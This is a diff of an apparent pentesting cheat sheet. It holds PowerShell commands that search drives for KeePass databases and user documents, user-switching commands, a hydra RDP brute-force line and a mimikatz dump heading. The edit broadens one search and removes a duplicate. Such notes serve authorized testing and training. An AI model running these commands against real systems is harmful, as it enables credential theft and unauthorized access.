@@ -24,7 +24,7 @@ Get-Process | findstr /V /R "svchost winlogon vm3dservice RuntimeBroker vmtoolsd
 
 ```powershell
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\Users\$USER\ -Include *.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\ -Include *.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 net user $USER
 runas /user:$USER cmd
 ```
@@ -214,13 +214,6 @@ Brute force RDP:
 ```bash
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p $PASSWORD rdp://$TARGET_IP -I
 ```
-
-Check FS for keepass files:
-
-```powershell
-Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
-```
-
 
 mimikatz dump as local admin:
 #dump #mimikatz
